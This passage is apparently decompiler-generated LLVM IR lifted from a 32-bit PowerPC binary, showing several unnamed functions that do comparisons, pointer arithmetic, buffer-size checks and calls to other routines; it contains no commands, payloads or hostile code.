  %v0_10007734 = load i32, i32* %r0.global-to-local, align 4
  %v3_10007734 = icmp eq i32 %v0_10007734, 46
  store i1 %v3_10007734, i1* %cr7_eq.global-to-local, align 1
  %v1_10007738 = load i32, i32* %r11.global-to-local, align 4
  %v2_10007738 = or i32 %v1_10007738, %v0_10007738
  store i32 %v2_10007738, i32* %r6.global-to-local, align 4
  br i1 %v3_10007734, label %dec_label_pc_10007740, label %dec_label_pc_10007754

dec_label_pc_10007740:                            ; preds = %dec_label_pc_10007734
  %v3_10007740 = icmp eq i32 %v0_10007728, 3
  store i1 %v3_10007740, i1* %cr7_eq.global-to-local, align 1
  %v1_10007744 = add i32 %v0_10007728, 1
  store i32 %v1_10007744, i32* %r5.global-to-local, align 4
  br i1 %v3_10007740, label %dec_label_pc_1000775c, label %dec_label_pc_1000774c

dec_label_pc_1000774c:                            ; preds = %dec_label_pc_10007740
  %v0_1000774c = load i32, i32* @r3, align 4
  %v1_1000774c = add i32 %v0_1000774c, 1
  store i32 %v1_1000774c, i32* @r3, align 4
  br label %dec_label_pc_1000765c

dec_label_pc_10007754:                            ; preds = %dec_label_pc_10007734
  %v3_10007754 = icmp eq i32 %v0_10007734, 0
  store i1 %v3_10007754, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007754, label %dec_label_pc_10007760, label %dec_label_pc_1000775c

dec_label_pc_1000775c:                            ; preds = %dec_label_pc_10007740, %dec_label_pc_10007720, %dec_label_pc_100076d8, %dec_label_pc_10007700, %dec_label_pc_10007754
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10007760

dec_label_pc_10007760:                            ; preds = %dec_label_pc_10007754, %dec_label_pc_1000775c
  %v0_10007760 = phi i32 [ %v2_10007738, %dec_label_pc_10007754 ], [ -1, %dec_label_pc_1000775c ]
  ret i32 %v0_10007760

; uselistorder directives
  uselistorder i32 %v1_1000774c, { 1, 0 }
  uselistorder i32 %v1_10007730, { 1, 0 }
  uselistorder i32 %v0_10007738.pre, { 1, 0 }
  uselistorder i32 %v3_10007710, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1, 3 }
  uselistorder i32 %v5_100076ac, { 1, 0, 2 }
  uselistorder i32 %v0_10007698, { 1, 0 }
  uselistorder i1 %v3_1000767c, { 1, 0 }
  uselistorder i32 %v0_10007670, { 1, 0, 2, 3 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r7.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r11.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 7, 6, 8, 10, 11, 12 }
  uselistorder label %dec_label_pc_10007760, { 1, 0 }
  uselistorder label %dec_label_pc_1000775c, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_10007734, { 1, 0 }
  uselistorder label %dec_label_pc_10007720, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10007700, { 1, 0 }
  uselistorder label %dec_label_pc_10007698, { 2, 0, 1 }
}

define i32 @function_10007770(i32 %arg1) local_unnamed_addr {
dec_label_pc_10007770:
  %stack_var_-24 = alloca i32, align 4
  %v2_10007778 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10007778, i32* @r4, align 4
  store i32 268466052, i32* @lr, align 4
  %v1_10007780 = bitcast i32* %stack_var_-24 to i8*
  %v2_10007780 = call i32 @function_1000a794(i8* %v1_10007780)
  %v3_10007784 = icmp eq i32 %v2_10007780, 0
  br i1 %v3_10007784, label %dec_label_pc_10007794, label %dec_label_pc_10007790

dec_label_pc_10007790:                            ; preds = %dec_label_pc_10007770
  %v3_10007790 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_10007794

dec_label_pc_10007794:                            ; preds = %dec_label_pc_10007770, %dec_label_pc_10007790
  %v0_100077a0 = phi i32 [ -1, %dec_label_pc_10007770 ], [ %v3_10007790, %dec_label_pc_10007790 ]
  ret i32 %v0_100077a0

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10007794, { 1, 0 }
}

define i32 @function_100077a4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100077a4:
  %stack_var_-40 = alloca i32, align 4
  %v0_100077b8 = call i32 @function_10009548()
  %v2_100077c8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268466144, i32* @lr, align 4
  %v7_100077dc = call i32 @function_100077f8(i32 %arg1, i32* nonnull @global_var_10012ae0.248, i32 ptrtoint (i32* @global_var_10012914.249 to i32), i32 460, i32 %v2_100077c8, i32 %v0_100077b8)
  %v3_100077e4 = load i32, i32* %stack_var_-40, align 4
  ret i32 %v3_100077e4
}

define i32 @function_100077f8(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_100077f8:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %v0_100077fc = load i32, i32* @lr, align 4
  store i32 %v0_100077fc, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r23, align 4
  %v3_10007804 = icmp eq i32 %arg1, 0
  store i32 0, i32* @r31, align 4
  store i32 %arg5, i32* %r20.global-to-local, align 4
  store i32 %tmp, i32* %r26.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* %r29.global-to-local, align 4
  store i32 %arg6, i32* @r24, align 4
  %v2_10007824 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_10007824, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  br i1 %v3_10007804, label %dec_label_pc_10007b28, label %dec_label_pc_10007830

dec_label_pc_10007830:                            ; preds = %dec_label_pc_100077f8
  %v0_10007830 = call i32 @function_10004b48()
  store i32 %v0_10007830, i32* %r3.global-to-local, align 4
  %v1_10007838 = inttoptr i32 %v0_10007830 to i32*
  %v2_10007838 = load i32, i32* %v1_10007838, align 4
  store i32 %v2_10007838, i32* @r27, align 4
  store i32 %v0_10007830, i32* %r28.global-to-local, align 4
  %v0_10007840 = load i32, i32* @r31, align 4
  store i32 %v0_10007840, i32* %v1_10007838, align 4
  %v0_10007844 = load i32, i32* %r26.global-to-local, align 4
  %v0_10007848 = load i32, i32* @r23, align 4
  store i32 %v0_10007848, i32* %r3.global-to-local, align 4
  %v0_1000784c = load i32, i32* %r30.global-to-local, align 4
  %v0_10007850 = load i32, i32* %r29.global-to-local, align 4
  %v0_10007854 = load i32, i32* %r20.global-to-local, align 4
  %v0_10007858 = load i32, i32* @r24, align 4
  store i32 268466272, i32* @lr, align 4
  %v7_1000785c = call i32 @function_1000b1c4(i32 %v0_10007848, i32 2, i32 %v0_10007844, i32 %v0_1000784c, i32 %v0_10007850, i32 %v0_10007854, i32 %v0_10007858)
  store i32 %v7_1000785c, i32* %r3.global-to-local, align 4
  %v3_10007860 = icmp eq i32 %v7_1000785c, 0
  br i1 %v3_10007860, label %dec_label_pc_10007b28, label %dec_label_pc_10007868

dec_label_pc_10007868:                            ; preds = %dec_label_pc_10007830
  %v0_10007868 = load i32, i32* @r24, align 4
  %v1_10007868 = inttoptr i32 %v0_10007868 to i32*
  %v2_10007868 = load i32, i32* %v1_10007868, align 4
  store i32 %v2_10007868, i32* %r0.global-to-local, align 4
  %v3_1000786c = icmp eq i32 %v2_10007868, 1
  br i1 %v3_1000786c, label %dec_label_pc_10007890, label %dec_label_pc_10007874

dec_label_pc_10007874:                            ; preds = %dec_label_pc_10007868
  %v3_10007874 = icmp eq i32 %v2_10007868, 4
  br i1 %v3_10007874, label %dec_label_pc_10007890, label %dec_label_pc_1000787c

dec_label_pc_1000787c:                            ; preds = %dec_label_pc_10007874
  %v3_1000787c = icmp eq i32 %v2_10007868, -1
  br i1 %v3_1000787c, label %dec_label_pc_10007884, label %dec_label_pc_10007b28

dec_label_pc_10007884:                            ; preds = %dec_label_pc_1000787c
  %v0_10007884 = load i32, i32* @r28, align 4
  %v1_10007884 = inttoptr i32 %v0_10007884 to i32*
  %v2_10007884 = load i32, i32* %v1_10007884, align 4
  store i32 %v2_10007884, i32* %r0.global-to-local, align 4
  %v3_10007888 = icmp eq i32 %v2_10007884, 2
  br i1 %v3_10007888, label %dec_label_pc_10007890, label %dec_label_pc_10007b28

dec_label_pc_10007890:                            ; preds = %dec_label_pc_10007884, %dec_label_pc_10007874, %dec_label_pc_10007868
  %v0_10007890 = load i32, i32* @r30, align 4
  %v1_10007890 = sub i32 0, %v0_10007890
  store i32 %v1_10007890, i32* %r0.global-to-local, align 4
  %v0_10007894 = load i32, i32* @r27, align 4
  %v1_10007894 = load i32, i32* @r28, align 4
  %v2_10007894 = inttoptr i32 %v1_10007894 to i32*
  store i32 %v0_10007894, i32* %v2_10007894, align 4
  %v0_10007898 = load i32, i32* %r0.global-to-local, align 4
  %v1_10007898 = urem i32 %v0_10007898, 4
  store i32 %v1_10007898, i32* %r0.global-to-local, align 4
  %v3_10007898 = icmp eq i32 %v1_10007898, 0
  %v0_100078b0.pre = load i32, i32* @r29, align 4
  br i1 %v3_10007898, label %dec_label_pc_100078b0, label %dec_label_pc_100078a0

dec_label_pc_100078a0:                            ; preds = %dec_label_pc_10007890
  %v2_100078a0 = icmp ult i32 %v0_100078b0.pre, %v1_10007898
  br i1 %v2_100078a0, label %dec_label_pc_10007b24, label %dec_label_pc_100078a8

dec_label_pc_100078a8:                            ; preds = %dec_label_pc_100078a0
  %v2_100078a8 = sub i32 %v0_100078b0.pre, %v1_10007898
  store i32 %v2_100078a8, i32* @r29, align 4
  %v0_100078ac = load i32, i32* @r30, align 4
  %v2_100078ac = add i32 %v0_100078ac, %v1_10007898
  store i32 %v2_100078ac, i32* @r30, align 4
  br label %dec_label_pc_100078b0

dec_label_pc_100078b0:                            ; preds = %dec_label_pc_10007890, %dec_label_pc_100078a8
  %v0_100078b0 = phi i32 [ %v2_100078a8, %dec_label_pc_100078a8 ], [ %v0_100078b0.pre, %dec_label_pc_10007890 ]
  %v1_100078b8 = load i32, i32* @r24, align 4
  %v2_100078b8 = inttoptr i32 %v1_100078b8 to i32*
  store i32 -1, i32* %v2_100078b8, align 4
  %tmp29 = icmp ult i32 %v0_100078b0, 4
  br i1 %tmp29, label %dec_label_pc_10007b24, label %dec_label_pc_100078c0

dec_label_pc_100078c0:                            ; preds = %dec_label_pc_100078b0
  %v0_100078c0 = load i32, i32* @r29, align 4
  %v1_100078c0 = add i32 %v0_100078c0, -4
  store i32 %v1_100078c0, i32* %r0.global-to-local, align 4
  %tmp30 = icmp ult i32 %v1_100078c0, 8
  br i1 %tmp30, label %dec_label_pc_10007b24, label %dec_label_pc_100078cc

dec_label_pc_100078cc:                            ; preds = %dec_label_pc_100078c0
  %v1_100078cc = add i32 %v0_100078c0, -12
  store i32 %v1_100078cc, i32* %r0.global-to-local, align 4
  %v0_100078d0 = load i32, i32* @r30, align 4
  %v1_100078d0 = add i32 %v0_100078d0, 4
  store i32 %v1_100078d0, i32* %r25.global-to-local, align 4
  store i32 0, i32* %r28.global-to-local, align 4
  %v3_100078dc = inttoptr i32 %v1_100078d0 to i32*
  store i32 %v0_100078d0, i32* %v3_100078dc, align 4
  %v0_100078e0 = load i32, i32* %r28.global-to-local, align 4
  %v1_100078e0 = load i32, i32* %r25.global-to-local, align 4
  %v2_100078e0 = add i32 %v1_100078e0, 4
  %v3_100078e0 = inttoptr i32 %v2_100078e0 to i32*
  store i32 %v0_100078e0, i32* %v3_100078e0, align 4
  %tmp31 = icmp ult i32 %v1_100078cc, 32
  br i1 %tmp31, label %dec_label_pc_10007b24, label %dec_label_pc_100078e8

dec_label_pc_100078e8:                            ; preds = %dec_label_pc_100078cc
  %v0_100078e8 = load i32, i32* @r29, align 4
  %v1_100078e8 = add i32 %v0_100078e8, -44
  %tmp32 = icmp ult i32 %v1_100078e8, 256
  br i1 %tmp32, label %dec_label_pc_10007b24, label %dec_label_pc_100078f4

dec_label_pc_100078f4:                            ; preds = %dec_label_pc_100078e8
  %v0_100078f4 = load i32, i32* @r30, align 4
  %v1_100078f4 = add i32 %v0_100078f4, 44
  store i32 %v1_100078f4, i32* @r31, align 4
  %v0_100078f8 = load i32, i32* @r23, align 4
  store i32 %v0_100078f8, i32* @r4, align 4
  %v1_10007900 = add i32 %v0_100078f4, 12
  store i32 %v1_10007900, i32* %r21.global-to-local, align 4
  store i32 %v1_100078f4, i32* %r3.global-to-local, align 4
  store i32 268466444, i32* @lr, align 4
  %v3_10007908 = call i32 @function_10007068(i32 %v1_100078f4, i32 %v0_100078f8, i32 %v1_100078e8)
  %v0_1000790c = load i32, i32* @r31, align 4
  %v1_1000790c = load i32, i32* @r30, align 4
  %v2_1000790c = add i32 %v1_1000790c, 12
  %v3_1000790c = inttoptr i32 %v2_1000790c to i32*
  store i32 %v0_1000790c, i32* %v3_1000790c, align 4
  %v0_10007910 = load i32, i32* %r28.global-to-local, align 4
  %v1_10007910 = load i32, i32* %r21.global-to-local, align 4
  %v2_10007910 = add i32 %v1_10007910, 4
  %v3_10007910 = inttoptr i32 %v2_10007910 to i32*
  store i32 %v0_10007910, i32* %v3_10007910, align 4
  %v0_10007914 = load i32, i32* @r23, align 4
  store i32 %v0_10007914, i32* %r3.global-to-local, align 4
  %v0_10007918 = load i32, i32* @r30, align 4
  store i32 %v0_10007918, i32* @r4, align 4
  store i32 268466464, i32* @lr, align 4
  %v2_1000791c = inttoptr i32 %v0_10007914 to i8*
  %v3_1000791c = call i32 @function_1000a794(i8* %v2_1000791c)
  store i32 %v3_1000791c, i32* %r3.global-to-local, align 4
  store i32 %v3_1000791c, i32* %r22.global-to-local, align 4
  %v3_10007920 = icmp eq i32 %v3_1000791c, 0
  br i1 %v3_10007920, label %dec_label_pc_10007954, label %dec_label_pc_10007928

dec_label_pc_10007928:                            ; preds = %dec_label_pc_100078f4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10007930 = load i32, i32* @r26, align 4
  %v2_10007930 = add i32 %v1_10007930, 8
  %v3_10007930 = inttoptr i32 %v2_10007930 to i32*
  store i32 2, i32* %v3_10007930, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_10007938 = load i32, i32* @r31, align 4
  %v1_10007938 = load i32, i32* @r26, align 4
  %v2_10007938 = inttoptr i32 %v1_10007938 to i32*
  store i32 %v0_10007938, i32* %v2_10007938, align 4
  %v0_1000793c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000793c = load i32, i32* @r26, align 4
  %v2_1000793c = add i32 %v1_1000793c, 12
  %v3_1000793c = inttoptr i32 %v2_1000793c to i32*
  store i32 %v0_1000793c, i32* %v3_1000793c, align 4
  %v0_10007940 = load i32, i32* %r25.global-to-local, align 4
  %v1_10007940 = load i32, i32* @r26, align 4
  %v2_10007940 = add i32 %v1_10007940, 16
  %v3_10007940 = inttoptr i32 %v2_10007940 to i32*
  store i32 %v0_10007940, i32* %v3_10007940, align 4
  %v0_10007944 = load i32, i32* %r21.global-to-local, align 4
  %v1_10007944 = load i32, i32* @r26, align 4
  %v2_10007944 = add i32 %v1_10007944, 4
  %v3_10007944 = inttoptr i32 %v2_10007944 to i32*
  store i32 %v0_10007944, i32* %v3_10007944, align 4
  %v0_10007948 = load i32, i32* @r26, align 4
  %v1_10007948 = load i32, i32* @r20, align 4
  %v2_10007948 = inttoptr i32 %v1_10007948 to i32*
  store i32 %v0_10007948, i32* %v2_10007948, align 4
  %v0_1000794c = load i32, i32* %r28.global-to-local, align 4
  %v1_1000794c = load i32, i32* @r24, align 4
  %v2_1000794c = inttoptr i32 %v1_1000794c to i32*
  store i32 %v0_1000794c, i32* %v2_1000794c, align 4
  br label %dec_label_pc_10007b28

dec_label_pc_10007954:                            ; preds = %dec_label_pc_100078f4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r29.global-to-local, align 4
  store i32 268466524, i32* @lr, align 4
  %v0_10007958 = call i32 @function_1000aef0()
  store i32 ptrtoint (i32* @global_var_100103e0.250 to i32), i32* %r29.global-to-local, align 4
  %v2_10007960 = ptrtoint i32* %stack_var_-116 to i32
  store i32 %v2_10007960, i32* %r28.global-to-local, align 4
  store i32 %v2_10007960, i32* @r3, align 4
  %v0_10007974 = call i32 @function_10008c84()
  store i32 ptrtoint (i32* @global_var_100103e0.250 to i32), i32* %r3.global-to-local, align 4
  %v0_1000797c = call i32 @function_10008c7c()
  %v3_10007984 = load i32, i32* @global_var_100104c8.251, align 4
  store i32 %v3_10007984, i32* %r29.global-to-local, align 4
  store i32 %v2_10007960, i32* @r3, align 4
  %v0_10007990 = call i32 @function_10008c84()
  %v0_10007998 = load i32, i32* @r23, align 4
  store i32 %v0_10007998, i32* %r3.global-to-local, align 4
  %v2_100079a8 = ptrtoint i32* %stack_var_-120 to i32
  %v2_100079ac = ptrtoint i32* %stack_var_-100 to i32
  %v0_100079b0 = load i32, i32* %r22.global-to-local, align 4
  store i32 268466624, i32* @lr, align 4
  %v6_100079bc = inttoptr i32 %v0_10007998 to i8*
  %v7_100079bc = call i32 @function_1000a854(i8* %v6_100079bc, i32 1, i32 %v3_10007984, i32 ptrtoint (i32* @global_var_10012d4c.252 to i32), i32 %v2_100079a8, i32 %v2_100079ac)
  store i32 %v7_100079bc, i32* %r3.global-to-local, align 4
  %v1_100079c0 = icmp slt i32 %v7_100079bc, 0
  br i1 %v1_100079c0, label %dec_label_pc_10007b08, label %dec_label_pc_100079c8

dec_label_pc_100079c8:                            ; preds = %dec_label_pc_10007954
  store i32 %tmp19, i32* %r11.global-to-local, align 4
  %v1_100079d0 = add i32 %tmp19, 4
  %v2_100079d4 = mul i32 %v0_100079b0, %v1_100079d0
  %v1_100079d8 = add i32 %v2_100079d4, 256
  %v1_100079dc = load i32, i32* @r27, align 4
  %v3_100079dc = icmp ugt i32 %v1_100079d8, %v1_100079dc
  br i1 %v3_100079dc, label %dec_label_pc_100079e4, label %dec_label_pc_10007a00

dec_label_pc_100079e4:                            ; preds = %dec_label_pc_100079c8
  %v3_100079e4 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_100079e4, i32* %r3.global-to-local, align 4
  store i32 268466668, i32* @lr, align 4
  %v1_100079e8 = call i32 @function_10007e48(i32 %v3_100079e4)
  %v3_100079ec = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_100079ec, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100079f4.253 to i32), i32* @lr, align 4
  %v1_100079f0 = call i32 @function_10007e48(i32 %v3_100079ec)
  store i32 34, i32* %r3.global-to-local, align 4
  %v0_100079f8 = load i32, i32* @r19, align 4
  %v1_100079f8 = load i32, i32* @r24, align 4
  %v2_100079f8 = inttoptr i32 %v1_100079f8 to i32*
  store i32 %v0_100079f8, i32* %v2_100079f8, align 4
  br label %dec_label_pc_10007b28

dec_label_pc_10007a00:                            ; preds = %dec_label_pc_100079c8
  %v3_10007a00 = icmp eq i32 %v0_100079b0, 0
  br i1 %v3_10007a00, label %dec_label_pc_10007a00.dec_label_pc_10007aa4_crit_edge, label %dec_label_pc_10007a08

dec_label_pc_10007a00.dec_label_pc_10007aa4_crit_edge: ; preds = %dec_label_pc_10007a00
  %v0_10007aac.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10007aa4

dec_label_pc_10007a08:                            ; preds = %dec_label_pc_10007a00
  %v2_10007a08 = mul i32 %v0_100079b0, %tmp19
  store i32 %v2_10007a08, i32* @r5, align 4
  %v0_10007a0c = load i32, i32* @r30, align 4
  %v1_10007a0c = add i32 %v0_10007a0c, 36
  store i32 %v1_10007a0c, i32* %r3.global-to-local, align 4
  %v0_10007a10 = load i32, i32* @r31, align 4
  store i32 268466712, i32* @lr, align 4
  %v2_10007a14 = call i32 @function_1000a3e4(i32 %v1_10007a0c, i32 %v0_10007a10)
  store i32 %v2_10007a14, i32* %r3.global-to-local, align 4
  store i32 %v2_10007a08, i32* %r0.global-to-local, align 4
  %v0_10007a24 = load i32, i32* @r30, align 4
  %v1_10007a24 = load i32, i32* @r31, align 4
  %v3_10007a24 = add i32 %v1_10007a24, %v2_10007a08
  %v4_10007a24 = inttoptr i32 %v3_10007a24 to i32*
  store i32 %v0_10007a24, i32* %v4_10007a24, align 4
  %v0_10007a28 = load i32, i32* @r31, align 4
  %v1_10007a28 = load i32, i32* %r0.global-to-local, align 4
  %v2_10007a28 = add i32 %v1_10007a28, %v0_10007a28
  store i32 %v2_10007a28, i32* @r25, align 4
  %v1_10007a30 = add i32 %v0_100079b0, -1
  store i32 %v1_10007a30, i32* %r11.global-to-local, align 4
  %v1_10007a34 = add i32 %v0_100079b0, 1
  %v2_10007a38 = icmp sgt i32 %v1_10007a30, -1
  store i32 %v1_10007a34, i32* %ctr.global-to-local, align 4
  br i1 %v2_10007a38, label %dec_label_pc_10007a68.preheader, label %dec_label_pc_10007a44

dec_label_pc_10007a44:                            ; preds = %dec_label_pc_10007a08
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10007a68.preheader

dec_label_pc_10007a68.preheader:                  ; preds = %dec_label_pc_10007a44, %dec_label_pc_10007a08
  %v0_10007a706 = phi i32 [ 1, %dec_label_pc_10007a44 ], [ %v1_10007a34, %dec_label_pc_10007a08 ]
  %v1_10007a683 = mul i32 %v1_10007a30, 4
  store i32 %v1_10007a683, i32* %r0.global-to-local, align 4
  %v2_10007a6c5 = add i32 %v2_10007a28, %v1_10007a683
  %v1_10007a707 = add i32 %v0_10007a706, -1
  store i32 %v1_10007a707, i32* %ctr.global-to-local, align 4
  %v2_10007a708 = icmp eq i32 %v1_10007a707, 0
  br i1 %v2_10007a708, label %dec_label_pc_10007a74, label %dec_label_pc_10007a50

dec_label_pc_10007a50:                            ; preds = %dec_label_pc_10007a68.preheader, %dec_label_pc_10007a50.dec_label_pc_10007a50_crit_edge
  %v1_10007a64 = phi i32 [ %v2_10007a6c, %dec_label_pc_10007a50.dec_label_pc_10007a50_crit_edge ], [ %v2_10007a6c5, %dec_label_pc_10007a68.preheader ]
  %v0_10007a5c = phi i32 [ %v0_10007a5c.pre, %dec_label_pc_10007a50.dec_label_pc_10007a50_crit_edge ], [ %v0_10007a28, %dec_label_pc_10007a68.preheader ]
  %v0_10007a54 = phi i32 [ %v0_10007a68, %dec_label_pc_10007a50.dec_label_pc_10007a50_crit_edge ], [ %v1_10007a30, %dec_label_pc_10007a68.preheader ]
  %v2_10007a54 = mul i32 %v0_10007a54, %tmp19
  %v1_10007a58 = add i32 %v0_10007a54, -1
  store i32 %v1_10007a58, i32* %r11.global-to-local, align 4
  %v2_10007a5c = add i32 %v0_10007a5c, -8
  %v1_10007a60 = add i32 %v2_10007a5c, %v2_10007a54
  %v2_10007a64 = add i32 %v1_10007a64, 4
  %v3_10007a64 = inttoptr i32 %v2_10007a64 to i32*
  store i32 %v1_10007a60, i32* %v3_10007a64, align 4
  %v0_10007a68 = load i32, i32* %r11.global-to-local, align 4
  %v1_10007a68 = mul i32 %v0_10007a68, 4
  store i32 %v1_10007a68, i32* %r0.global-to-local, align 4
  %v1_10007a6c = load i32, i32* @r25, align 4
  %v0_10007a70 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10007a70 = add i32 %v0_10007a70, -1
  store i32 %v1_10007a70, i32* %ctr.global-to-local, align 4
  %v2_10007a70 = icmp eq i32 %v1_10007a70, 0
  br i1 %v2_10007a70, label %dec_label_pc_10007a74, label %dec_label_pc_10007a50.dec_label_pc_10007a50_crit_edge

dec_label_pc_10007a50.dec_label_pc_10007a50_crit_edge: ; preds = %dec_label_pc_10007a50
  %v2_10007a6c = add i32 %v1_10007a6c, %v1_10007a68
  %v0_10007a5c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10007a50

dec_label_pc_10007a74:                            ; preds = %dec_label_pc_10007a50, %dec_label_pc_10007a68.preheader
  %v1_10007a80 = phi i32 [ %v2_10007a28, %dec_label_pc_10007a68.preheader ], [ %v1_10007a6c, %dec_label_pc_10007a50 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10007a7c = mul i32 %v0_100079b0, 4
  %v2_10007a80 = add i32 %v1_10007a7c, 4
  %v2_10007a84 = add i32 %v2_10007a80, %v1_10007a80
  %v3_10007a84 = inttoptr i32 %v2_10007a84 to i32*
  store i32 0, i32* %v3_10007a84, align 4
  %v0_10007a90 = load i32, i32* @r25, align 4
  %v2_10007a90 = add i32 %v0_10007a90, %v1_10007a7c
  store i32 %v2_10007a90, i32* %r11.global-to-local, align 4
  %v1_10007a94 = load i32, i32* @r31, align 4
  %v2_10007a94 = sub i32 %v1_10007a94, %v2_10007a90
  %v1_10007a98 = add i32 %v2_10007a90, 8
  store i32 %v1_10007a98, i32* @r31, align 4
  %v0_10007a9c = load i32, i32* @r27, align 4
  %v2_10007a9c = add i32 %v0_10007a9c, %v2_10007a94
  %v1_10007aa0 = add i32 %v2_10007a9c, -8
  br label %dec_label_pc_10007aa4

dec_label_pc_10007aa4:                            ; preds = %dec_label_pc_10007a00.dec_label_pc_10007aa4_crit_edge, %dec_label_pc_10007a74
  %v0_10007aac = phi i32 [ %v0_10007aac.pre, %dec_label_pc_10007a00.dec_label_pc_10007aa4_crit_edge ], [ %v1_10007a98, %dec_label_pc_10007a74 ]
  %v0_10007aa8 = phi i32 [ %v1_100079dc, %dec_label_pc_10007a00.dec_label_pc_10007aa4_crit_edge ], [ %v1_10007aa0, %dec_label_pc_10007a74 ]
  %v3_10007aa4 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_10007aa4, i32* @r4, align 4
  store i32 %v0_10007aac, i32* %r3.global-to-local, align 4
  store i32 268466868, i32* @lr, align 4
  %v3_10007ab0 = call i32 @function_10007068(i32 %v0_10007aac, i32 %v3_10007aa4, i32 %v0_10007aa8)
  %v3_10007ab4 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_10007ab4, i32* %r3.global-to-local, align 4
  store i32 268466876, i32* @lr, align 4
  %v1_10007ab8 = call i32 @function_10007e48(i32 %v3_10007ab4)
  store i32 %v1_10007ab8, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* %r0.global-to-local, align 4
  %v3_10007ac0 = icmp eq i32 %tmp18, 1
  br i1 %v3_10007ac0, label %dec_label_pc_10007ac8, label %dec_label_pc_10007b10

dec_label_pc_10007ac8:                            ; preds = %dec_label_pc_10007aa4
  store i32 4, i32* @r5, align 4
  %v0_10007ad0 = load i32, i32* @r30, align 4
  store i32 %v0_10007ad0, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10007ad8.254 to i32), i32* @lr, align 4
  %v0_10007ad4 = call i32 @function_10006d8c()
  %v1_10007adc = load i32, i32* @r26, align 4
  %v2_10007adc = add i32 %v1_10007adc, 8
  %v3_10007adc = inttoptr i32 %v2_10007adc to i32*
  store i32 2, i32* %v3_10007adc, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_10007ae4 = load i32, i32* @r26, align 4
  %v2_10007ae4 = add i32 %v1_10007ae4, 12
  %v3_10007ae4 = inttoptr i32 %v2_10007ae4 to i32*
  store i32 4, i32* %v3_10007ae4, align 4
  %v0_10007ae8 = load i32, i32* @r31, align 4
  %v1_10007ae8 = load i32, i32* @r26, align 4
  %v2_10007ae8 = inttoptr i32 %v1_10007ae8 to i32*
  store i32 %v0_10007ae8, i32* %v2_10007ae8, align 4
  %v0_10007aec = load i32, i32* @r25, align 4
  %v1_10007aec = load i32, i32* @r26, align 4
  %v2_10007aec = add i32 %v1_10007aec, 16
  %v3_10007aec = inttoptr i32 %v2_10007aec to i32*
  store i32 %v0_10007aec, i32* %v3_10007aec, align 4
  %v0_10007af0 = load i32, i32* @r21, align 4
  %v1_10007af0 = load i32, i32* @r26, align 4
  %v2_10007af0 = add i32 %v1_10007af0, 4
  %v3_10007af0 = inttoptr i32 %v2_10007af0 to i32*
  store i32 %v0_10007af0, i32* %v3_10007af0, align 4
  %v3_10007af4 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_10007af4, i32* %r3.global-to-local, align 4
  store i32 268466940, i32* @lr, align 4
  %v1_10007af8 = call i32 @function_10007e48(i32 %v3_10007af4)
  store i32 %v1_10007af8, i32* %r3.global-to-local, align 4
  %v0_10007afc = load i32, i32* @r26, align 4
  %v1_10007afc = load i32, i32* @r20, align 4
  %v2_10007afc = inttoptr i32 %v1_10007afc to i32*
  store i32 %v0_10007afc, i32* %v2_10007afc, align 4
  br label %dec_label_pc_10007b08

dec_label_pc_10007b08:                            ; preds = %dec_label_pc_10007b10, %dec_label_pc_10007954, %dec_label_pc_10007ac8
  %storemerge1 = phi i32 [ 0, %dec_label_pc_10007ac8 ], [ 2, %dec_label_pc_10007954 ], [ 2, %dec_label_pc_10007b10 ]
